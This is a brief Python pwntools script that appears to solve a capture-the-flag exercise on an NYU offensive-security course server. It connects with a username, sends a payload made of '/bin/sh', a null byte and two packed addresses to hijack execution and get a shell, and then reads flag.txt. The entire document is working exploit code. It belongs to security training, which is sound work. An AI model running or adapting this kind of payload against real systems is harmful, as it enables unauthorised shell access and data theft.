from pwn import *

p = connect("offsec-chalbroker.osiris.cyber.nyu.edu", 1341)
p.sendline("jm5833")
print p.recvuntil("save:")
p.sendline("/bin/sh" + chr(0) + p64(0x40074b) + p64(0x601010))
p.sendline("cat flag.txt")
p.interactive()
